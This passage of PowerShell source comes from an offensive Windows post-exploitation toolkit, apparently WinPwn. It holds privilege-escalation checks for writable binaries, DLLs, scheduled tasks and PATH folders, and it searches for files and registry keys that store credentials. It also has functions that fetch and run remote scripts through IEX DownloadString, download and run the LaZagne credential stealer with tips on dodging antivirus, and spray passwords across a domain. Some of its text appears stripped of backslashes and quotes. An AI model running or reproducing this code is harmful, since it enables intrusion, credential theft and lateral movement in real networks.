        $result = (Get-Acl $envProgramFiles).Access  ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on CWindowssystem32 } } }
        $result += (Get-Acl ${envProgramFiles(x86)}).Access  ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on CWindowssystem32 } } }
        if ($result -ne $null) { Write $result  Sort -Unique; $result  $currentPathLocalPrivEscProgramDirectoryWritePermissions.txt } else { Write Permissions set on Program Files directory are correct for all groups. }
        
        Write Program Files files and directories permissions - backdoor windows binaries
        $result = $null
        $result = Get-ChildItem $envProgramFiles -Recurse 2 $null  ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access }  ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on $o } } }
        $result += Get-ChildItem ${envProgramFiles(x86)} -Recurse 2 $null  ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access }  ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on $o } } }
        if ($result -ne $null) { Write $result  Sort -Unique ; $result  $currentPathLocalPrivEscProgramBinaryWritePermissions.txt } else { Write Permissions set on Program Files files and directories are correct for all groups. }
            
        Write ProgramData files and directories permissions - backdoor windows binaries
        $result = $null
        $result = Get-ChildItem $envProgramData -Recurse 2 $null  ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access }  ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on $o } } }
        if ($result -ne $null) { Write $result  Sort -Unique; $result  $currentPathLocalPrivEscProgramDataDirectoryPermissions.txt} else { Write Permissions set on ProgramData files and directories are correct for all groups. }
    
        Write Scheduled process binary permissions - backdoor binary
        $result = $null
        $result = schtasks query fo LIST V  findstr   findstr .  % { Trap { Continue } $o = $_.Split( ); $obj = $o[30..($o.Length-1)] -join ( ); If ($obj -like '') { $o = $obj.split('')[1] } ElseIf ($obj -like ' -') { $o = $obj.split('-')[0] } ElseIf ($obj -like ' ') { $o = $obj.split('')[0] } Else { $o = $obj }; If ($o -like '%%') { $var = $o.split('%')[1]; $out = resolve($var); $o = $o.replace(%$var%,$out) }; (Get-Acl $o 2 $null).Access }  ForEach-Object { Trap { Continue } ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on $o } } }
        if ($result -ne $null) { Write $result  Sort -Unique ; $result  $currentPathLocalPrivEscScheduledProcessBinaryPermissions.txt } else { Write Permissions set on scheduled binaries are correct for all groups. }
            
        
        Write Scheduled process directory permissions - try DLL injection
        $result = $null
        $result = schtasks query fo LIST V  findstr   findstr .  % { Trap { Continue } $o = $_.Split( ); $obj = $o[30..($o.Length-1)] -join ( ); If ($obj -like '') { $o = $obj.split('')[1] } ElseIf ($obj -like ' -') { $o = $obj.split('-')[0] } ElseIf ($obj -like ' ') { $o = $obj.split('')[0] } Else { $o = $obj }; If ($o -like '%%') { $var = $o.split('%')[1]; $out = resolve($var); $o = $o.replace(%$var%,$out) }; $obj = $o.Split(); $o = $obj[0..($obj.Length-2)] -join (); (Get-Acl $o 2 $null).Access }  ForEach-Object { Trap { Continue } ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on $o } } }
        if ($result -ne $null) { Write $result  Sort -Unique; $result  $currentPathLocalPrivEscScheduledProcessDirectoryPermissions.txt } else { Write Permissions set on scheduled binary directories are correct for all groups. }
                
        
        Write Loaded DLLs permissions - backdoor DLL
        $result = $null
        $result = ForEach ($item in (Get-WmiObject -Class CIM_ProcessExecutable)) { [wmi]$($item.Antecedent)  Where-Object {$_.Extension -eq 'dll'}  Select Name  ForEach-Object { $o = $_.Name; (Get-Acl $o 2 $null).Access }  ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on $o } } } }
        if ($result -ne $null) { Write $result  Sort -Unique; $result  $currentPathLocalPrivEscWriteDLLPermission.txt } else { Write Permissions set on loaded DLLs are correct for all groups. }
     }
     else
     {
        Write ------- Checking if SCCM is installed - installers are run with SYSTEM privileges, many are vulnerable to DLL Sideloading
        $result = $null
        $result = Get-WmiObject -Namespace rootccmclientSDK -Class CCM_Application -Property   select Name,SoftwareVersion
        if ($result) { $result }
        else { Write Not Installed. }
        
        Write ------- Checking privileges - rotten potato
        $result = $null
        $result = (whoami priv  findstr i CSeImpersonatePrivilege CSeAssignPrimaryPrivilege CSeTcbPrivilege CSeBackupPrivilege CSeRestorePrivilege CSeCreateTokenPrivilege CSeLoadDriverPrivilege CSeTakeOwnershipPrivilege CSeDebugPrivilege 2 $null)  Out-String
        if ($result) { Write $result; $result } else { Write User privileges do not allow for rotten potato exploit. }
        
        Write ------- System32 directory permissions - backdoor windows binaries
        $result = $null
        $result = (Get-Acl CWindowssystem32).Access  ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on CWindowssystem32 } } }
        if ($result -ne $null) { Write $result  Sort -Unique; $result } else { Write Permissions set on System32 directory are correct for all groups. }
        
        Write ------- System32 files and directories permissions - backdoor windows binaries
        $result = $null
        $result = Get-ChildItem CWindowssystem32 -Recurse 2 $null  ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access }  ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on $o } } }
        if ($result -ne $null) { Write $result  Sort -Unique; $result } else { Write Permissions set on System32 files and directories are correct for all groups. }
        
        Write ------- Program Files directory permissions - backdoor windows binaries
        $result = $null
        $result = (Get-Acl $envProgramFiles).Access  ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on CWindowssystem32 } } }
        $result += (Get-Acl ${envProgramFiles(x86)}).Access  ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on CWindowssystem32 } } }
        if ($result -ne $null) { Write $result  Sort -Unique; $result } else { Write Permissions set on Program Files directory are correct for all groups. }
        
        Write ------- Program Files files and directories permissions - backdoor windows binaries
        $result = $null
        $result = Get-ChildItem $envProgramFiles -Recurse 2 $null  ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access }  ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on $o } } }
        $result += Get-ChildItem ${envProgramFiles(x86)} -Recurse 2 $null  ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access }  ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on $o } } }
        if ($result -ne $null) { Write $result  Sort -Unique ; $result } else { Write Permissions set on Program Files files and directories are correct for all groups. }
            
        Write ------- ProgramData files and directories permissions - backdoor windows binaries
        $result = $null
        $result = Get-ChildItem $envProgramData -Recurse 2 $null  ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access }  ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on $o } } }
        if ($result -ne $null) { Write $result  Sort -Unique; $result } else { Write Permissions set on ProgramData files and directories are correct for all groups. }
    
        Write ------- Scheduled process binary permissions - backdoor binary
        $result = $null
        $result = schtasks query fo LIST V  findstr   findstr .  % { Trap { Continue } $o = $_.Split( ); $obj = $o[30..($o.Length-1)] -join ( ); If ($obj -like '') { $o = $obj.split('')[1] } ElseIf ($obj -like ' -') { $o = $obj.split('-')[0] } ElseIf ($obj -like ' ') { $o = $obj.split('')[0] } Else { $o = $obj }; If ($o -like '%%') { $var = $o.split('%')[1]; $out = resolve($var); $o = $o.replace(%$var%,$out) }; (Get-Acl $o 2 $null).Access }  ForEach-Object { Trap { Continue } ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on $o } } }
        if ($result -ne $null) { Write $result  Sort -Unique ; $result } else { Write Permissions set on scheduled binaries are correct for all groups. }
            
        
        Write ------- Scheduled process directory permissions - try DLL injection
        $result = $null
        $result = schtasks query fo LIST V  findstr   findstr .  % { Trap { Continue } $o = $_.Split( ); $obj = $o[30..($o.Length-1)] -join ( ); If ($obj -like '') { $o = $obj.split('')[1] } ElseIf ($obj -like ' -') { $o = $obj.split('-')[0] } ElseIf ($obj -like ' ') { $o = $obj.split('')[0] } Else { $o = $obj }; If ($o -like '%%') { $var = $o.split('%')[1]; $out = resolve($var); $o = $o.replace(%$var%,$out) }; $obj = $o.Split(); $o = $obj[0..($obj.Length-2)] -join (); (Get-Acl $o 2 $null).Access }  ForEach-Object { Trap { Continue } ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on $o } } }
        if ($result -ne $null) { Write $result  Sort -Unique; $result } else { Write Permissions set on scheduled binary directories are correct for all groups. }
                
        
        Write ------- Loaded DLLs permissions - backdoor DLL
        $result = $null
        $result = ForEach ($item in (Get-WmiObject -Class CIM_ProcessExecutable)) { [wmi]$($item.Antecedent)  Where-Object {$_.Extension -eq 'dll'}  Select Name  ForEach-Object { $o = $_.Name; (Get-Acl $o 2 $null).Access }  ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on $o } } } }
        if ($result -ne $null) { Write $result  Sort -Unique; $result } else { Write Permissions set on loaded DLLs are correct for all groups. }
     }    
     if(!$consoleoutput){
        Write Files that may contain passwords
        $i = 0
        if (Test-Path $envSystemDrivesysprep.inf) { Write $envSystemDrivesysprep.inf  $currentPathLocalPrivEscPasswordfiles.txt  ; $i = 1}
        if (Test-Path $envSystemDrivesysprepsysprep.xml) { Write $envSystemDrivesysprepsysprep.xml  $currentPathLocalPrivEscPasswordfiles.txt ; $i = 1 }
        if (Test-Path $envWINDIRPantherUnattendUnattended.xml) { Write $envWINDIRPantherUnattendUnattended.xml  $currentPathLocalPrivEscPasswordfiles.txt ; $i = 1 }
        if (Test-Path $envWINDIRPantherUnattended.xml) { Write $envWINDIRPantherUnattended.xml  $currentPathLocalPrivEscPasswordfiles.txt ; $i = 1 }
        if (Test-Path $envWINDIRsystem32sysprepUnattend.xml) { Write $envWINDIRsystem32sysprepUnattend.xml  $currentPathLocalPrivEscPasswordfiles.txt ; $i = 1 }
        if (Test-Path $envWINDIRsystem32sysprepPantherUnattend.xml) { Write $envWINDIRsystem32sysprepPantherUnattend.xml  $currentPathLocalPrivEscPasswordfiles.txt ; $i = 1 }
        if (Test-Path $envWINDIRPantherUnattendUnattended.xml) { Write $envWINDIRPantherUnattendUnattended.xml  $currentPathLocalPrivEscPasswordfiles.txt ; $i = 1 }
        if (Test-Path $envWINDIRPantherUnattend.xml) { Write $envWINDIRPantherUnattend.xml  $currentPathLocalPrivEscPasswordfiles.txt ; $i = 1 }
        if (Test-Path $envSystemDriveMININTSMSOSDOSDLOGSVARIABLES.DAT) { Write $envSystemDriveMININTSMSOSDOSDLOGSVARIABLES.DAT  $currentPathLocalPrivEscPasswordfiles.txt ; $i = 1 }
        if (Test-Path $envWINDIRpanthersetupinfo) { Write $envWINDIRpanthersetupinfo  $currentPathLocalPrivEscPasswordfiles.txt ; $i = 1 }
        if (Test-Path $envWINDIRpanthersetupinfo.bak) { Write $envWINDIRpanthersetupinfo.bak  $currentPathLocalPrivEscPasswordfiles.txt ; $i = 1 }
        if (Test-Path $envSystemDriveunattend.xml) { Write $envSystemDriveunattend.xml  $currentPathLocalPrivEscPasswordfiles.txt ; $i = 1 }
        if (Test-Path $envWINDIRsystem32sysprep.inf) { Write $envWINDIRsystem32sysprep.inf  $currentPathLocalPrivEscPasswordfiles.txt ; $i = 1 }
        if (Test-Path $envWINDIRsystem32sysprepsysprep.xml) { Write $envWINDIRsystem32sysprepsysprep.xml  $currentPathLocalPrivEscPasswordfiles.txt ; $i = 1 }
        if (Test-Path $envWINDIRMicrosoft.NETFramework64v4.0.30319Configweb.config) { Write $envWINDIRMicrosoft.NETFramework64v4.0.30319Configweb.config  $currentPathLocalPrivEscPasswordfiles.txt ; $i = 1 }
        if (Test-Path $envSystemDriveinetpubwwwrootweb.config) { Write $envSystemDriveinetpubwwwrootweb.config  $currentPathLocalPrivEscPasswordfiles.txt ; $i = 1 }
        if (Test-Path $envAllUsersProfileApplication DataMcAfeeCommon FrameworkSiteList.xml) { Write $envAllUsersProfileApplication DataMcAfeeCommon FrameworkSiteList.xml  $currentPathLocalPrivEscPasswordfiles.txt ; $i = 1 }
        if (Test-Path HKLMSOFTWARERealVNCWinVNC4) { Get-ChildItem -Path HKLMSOFTWARERealVNCWinVNC4  $currentPathLocalPrivEscPasswordfiles.txt ; $i = 1 }
        if (Test-Path HKCUSoftwareSimonTathamPuTTYSessions) { Get-ChildItem -Path HKCUSoftwareSimonTathamPuTTYSessions  $currentPathLocalPrivEscPasswordfiles.txt ; $i = 1 }
        if ($i -eq 0) { Write Files not found.}
        else {$out = get-content $currentPathLocalPrivEscPasswordfiles.txt; $out }
    }
    else
    {
        Write ------- Files that may contain passwords
        $i = 0
        if (Test-Path $envSystemDrivesysprep.inf) { Write $envSystemDrivesysprep.inf ; $i = 1}
        if (Test-Path $envSystemDrivesysprepsysprep.xml) { Write $envSystemDrivesysprepsysprep.xml ; $i = 1 }
        if (Test-Path $envWINDIRPantherUnattendUnattended.xml) { Write $envWINDIRPantherUnattendUnattended.xml ; $i = 1 }
        if (Test-Path $envWINDIRPantherUnattended.xml) { Write $envWINDIRPantherUnattended.xml ;$i = 1 }
        if (Test-Path $envWINDIRsystem32sysprepUnattend.xml) { Write $envWINDIRsystem32sysprepUnattend.xml ; $i = 1 }
        if (Test-Path $envWINDIRsystem32sysprepPantherUnattend.xml) { Write $envWINDIRsystem32sysprepPantherUnattend.xml ; $i = 1 }
        if (Test-Path $envWINDIRPantherUnattendUnattended.xml) { Write $envWINDIRPantherUnattendUnattended.xml ; $i = 1 }
        if (Test-Path $envWINDIRPantherUnattend.xml) { Write $envWINDIRPantherUnattend.xml ; $i = 1 }
        if (Test-Path $envSystemDriveMININTSMSOSDOSDLOGSVARIABLES.DAT) { Write $envSystemDriveMININTSMSOSDOSDLOGSVARIABLES.DAT ; $i = 1 }
        if (Test-Path $envWINDIRpanthersetupinfo) { Write $envWINDIRpanthersetupinfo ; $i = 1 }
        if (Test-Path $envWINDIRpanthersetupinfo.bak) { Write $envWINDIRpanthersetupinfo.bak ; $i = 1 }
        if (Test-Path $envSystemDriveunattend.xml) { Write $envSystemDriveunattend.xml ; $i = 1 }
        if (Test-Path $envWINDIRsystem32sysprep.inf) { Write $envWINDIRsystem32sysprep.inf ; $i = 1 }
        if (Test-Path $envWINDIRsystem32sysprepsysprep.xml) { Write $envWINDIRsystem32sysprepsysprep.xml ; $i = 1 }
        if (Test-Path $envWINDIRMicrosoft.NETFramework64v4.0.30319Configweb.config) { Write $envWINDIRMicrosoft.NETFramework64v4.0.30319Configweb.config ; $i = 1 }
        if (Test-Path $envSystemDriveinetpubwwwrootweb.config) { Write $envSystemDriveinetpubwwwrootweb.config ; $i = 1 }
        if (Test-Path $envAllUsersProfileApplication DataMcAfeeCommon FrameworkSiteList.xml) { Write $envAllUsersProfileApplication DataMcAfeeCommon FrameworkSiteList.xml ; $i = 1 }
        if (Test-Path HKLMSOFTWARERealVNCWinVNC4) { Get-ChildItem -Path HKLMSOFTWARERealVNCWinVNC4 ; $i = 1 }
        if (Test-Path HKCUSoftwareSimonTathamPuTTYSessions) { Get-ChildItem -Path HKCUSoftwareSimonTathamPuTTYSessions ; $i = 1 }
        if ($i -eq 0) { Write Files not found.}
        else {$out = get-content $currentPathLocalPrivEscPasswordfiles.txt; $out }
    }
    If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] Administrator)) 
    {
        Write-Warning This script will not function with administrative privileges. Please run as a normal user.
        Break
    }
    Write-Host -ForegroundColor Yellow 'Looking for Writable PATH variable folders'
    #Credit here httpsgist.github.comwdormanneb714d1d935bf454eb419a34be266f6f 
    $outfile = acltestfile
    set-variable -name paths -value (Get-ItemProperty -Path 'RegistryHKEY_LOCAL_MACHINESystemCurrentControlSetControlSession ManagerEnvironment' -Name PATH).path.Split(;)
    Write ------- Writable PATH Variable folders
    Foreach ($path in $paths) 
    {
        Try {
                [io.file]OpenWrite($path$outfile).close()
                Write-Warning I can write to '$path'
              if(!$consoleoutput){echo $path  $currentPathLocalPrivEscWritable_PATH_Variable_Folder.txt}else{echo $path}
                $insecure = 1
            }
            Catch {}
    }
    If ($insecure -eq 1) {
        Write-Warning Any directory above is in the system-wide directory list, but can also be written to by the current user.
        Write-Host This can allow privilege escalation. -ForegroundColor Red
    } Else {
        Write-Host Looks good! No system path can be written to by the current user. -ForegroundColor Green
    }
    if(!$consoleoutput){Reg1c1de  $currentPathLocalPrivEscWritebleRegistryKeys.txt}
}

function winPEAS
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )

    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName

    REG ADD HKCUConsole v VirtualTerminalLevel t REG_DWORD d 1 f
    if (!$noninteractive){invoke-expression 'cmd c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString('$S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-winPEAS.ps1'');Invoke-winPEAS -command '' '';pause}'}
    if ($noninteractive)
    {
        IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-winPEAS.ps1')
        if(!$consoleoutput){Invoke-winPEAS -command ' '  $currentPathLocalPrivEscwinPEAS.txt}else{Invoke-winPEAS -command 'cmd'}
    }
    REG DELETE HKCUConsole v VirtualTerminalLevel f
}

function Reg1c1de
{
  IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsInvoke-Reg1c1de.ps1')
  Invoke-Reg1c1de
}

function Privescmodules
{
  #
        .DESCRIPTION
        All privesc scripts are executed here.
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    #Privilege Escalation Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName

    @'
             
__        ___       ____                 
        (_)_ __   _ __      ___ __  
       '_  _)      '_  
   V  V        __  V  V    
   __  __ __     __ _ _
   -- local Privilege Escalation checks
'@
        if($noninteractive -and (!$consoleoutput))
        {
            itm4nprivesc
            winPEAS
            oldchecks
            otherchecks
            return
        }
        elseif($noninteractive -and $consoleoutput)
        {
            itm4nprivesc -noninteractive -consoleoutput
            winPEAS -noninteractive -consoleoutput
            oldchecks -noninteractive -consoleoutput
            otherchecks -noninteractive -consoleoutput
            return
        }

        
        do
        {
            Write-Host ================ WinPwn ================
            Write-Host -ForegroundColor Green '1. itm4ns Invoke-PrivescCheck'
            Write-Host -ForegroundColor Green '2. winPEAS! '
            Write-Host -ForegroundColor Green '3. Powersploits privesc checks! '
            Write-Host -ForegroundColor Green '4. All other checks! '
            Write-Host -ForegroundColor Green '5. Go back '
            Write-Host ================ WinPwn ================
            $masterquestion = Read-Host -Prompt 'Please choose wisely, master'
            
            Switch ($masterquestion) 
            {
                1{itm4nprivesc}
                2{winPEAS}
                3{oldchecks}
                4{otherchecks}
            }
        }
        While ($masterquestion -ne 5)  

}

function laZagnemodule
{
    #
        .DESCRIPTION
        Downloads and executes Lazagne from AlessandroZ for Credential gathering  privilege escalation.
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    #Privilege Escalation Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName

    if ($S3cur3Th1sSh1t_repo -eq httpsraw.githubusercontent.comS3cur3Th1sSh1t)
	{
		Invoke-WebRequest -Uri 'httpsgithub.comS3cur3Th1sSh1tCredsblobmasterexeFileswincreds.exeraw=true' -Outfile $currentPathWinCreds.exe
	}
	else
	{
		Invoke-WebRequest -Uri ($S3cur3Th1sSh1t_repo + 'CredsmasterexeFileswincreds.exe') -Outfile $currentPathWinCreds.exe
	}
    Write-Host -ForegroundColor Yellow 'Checking, if the file was killed by antivirus'
    if (Test-Path $currentPathWinCreds.exe)
    {
        Write-Host -ForegroundColor Yellow 'Not killed, Executing'
      if(!$consoleoutput){mkdir $currentPathLazagne}
        if(!$consoleoutput){.WinCreds.exe all  $currentPathLazagnePasswords.txt}else{.WinCreds.exe all}
        Write-Host -ForegroundColor Yellow 'Results saved to $currentPathLazagnePasswords.txt!'
    }
    else {Write-Host -ForegroundColor Red 'Antivirus got it, try an obfuscated version or In memory execution with Pupy'}
}

function latmov
{
    #
        .DESCRIPTION
        Looks for administrative Access on any system in the current networkdomain. If Admin Access is available somewhere, Credentials can be dumped remotely  alternatively Powershell_Empire Stager can be executed.
        Brute Force for all Domain Users with specific Passwords (for example Summer2018) can be done here.
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    #Lateral Movement Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName

    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsDomainPasswordSpray.ps1')
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsview.ps1')
    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]GetCurrentDomain().Name
    
    
    Write-Host -ForegroundColor Yellow 'Starting Lateral Movement Phase'

    Write-Host -ForegroundColor Yellow 'Searching for Domain Systems we can pwn with admin rights, this can take a while depending on the size of your domain'

    fuller  $currentPathExploitationLocalAdminAccess.txt

    $exploitdecision = Read-Host -Prompt 'Do you want to execite code remotely on all found Systems (yesno)'
    if ($exploitdecision -eq yes -or $exploitdecision -eq y)
    {
        launcher
    }
}

function Domainpassspray
{
    #
        .DESCRIPTION
        Domain password spray, credit to httpsgithub.comdafthack.
    #
    #Lateral Movement Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
    [Switch]
        $emptypasswords,
    [Switch]
        $usernameaspassword,
        [String]
        $password   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsDomainPasswordSpray.ps1')
    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]GetCurrentDomain().Name
    
    if ($emptypasswords)
    {
      IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsInvoke-SprayEmptyPassword.ps1')
    if(!$consoleoutput){Invoke-SprayEmptyPassword -outfile $currentPathExploitationEmptyPasswords.txt}
    else
    {
      Invoke-SprayEmptyPassword
    }
    }
    elseif($usernameaspassword)
    {
        if(!$consoleoutput){Get-DomainUserList -Domain $domain.Name  Out-File -Encoding ascii $currentPathDomainReconuserlist.txt}else{$list = Get-DomainUserList -Domain $domain.Name}
        if(!$consoleoutput){Invoke-DomainPasswordSpray -UserList $currentPathDomainReconuserlist.txt -UsernameAsPassword -Domain $domain.Name -OutFile $currentPathExploitationUsernameAsPasswordCreds.txt}else{Invoke-DomainPasswordSpray -UserList $list -Domain $domain.Name -UsernameAsPassword}  
        if(!$consoleoutput){Write-Host Successfull logins saved to $currentPathExploitationUsernameAsPasswordCreds.txt} 
    }
    else
    {    	  	
      if(!$consoleoutput){Get-DomainUserList -Domain $domain.Name -RemoveDisabled -RemovePotentialLockouts  Out-File -Encoding ascii $currentPathDomainReconuserlist.txt}else{$list = Get-DomainUserList -Domain $domain.Name -RemoveDisabled -RemovePotentialLockouts}
        if (Test-Path $currentPathpasslist.txt) 
        {
          Invoke-DomainPasswordSpray -UserList $currentPathDomainReconuserlist.txt -Domain $domain_Name.Name -PasswordList $currentPathpasslist.txt -OutFile $currentPathExploitationPwned-creds_Domainpasswordspray.txt
        }
        else 
        { 
           if(!$consoleoutput){$onepass = Read-Host -Prompt 'Please enter one Password for DomainSpray manually'}
           if(!$consoleoutput){Invoke-DomainPasswordSpray -UserList $currentPathDomainReconuserlist.txt -Domain $domain.Name -Password $onepass -OutFile $currentPathExploitationPwned-creds_Domainpasswordspray.txt}else{Invoke-DomainPasswordSpray -UserList $list -Domain $domain.Name -Password $password}  
           if(!$consoleoutput){Write-Host Successfull logins saved to $currentPathExploitationPwned-creds_Domainpasswordspray.txt}
    }
   }
}

function launcher
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
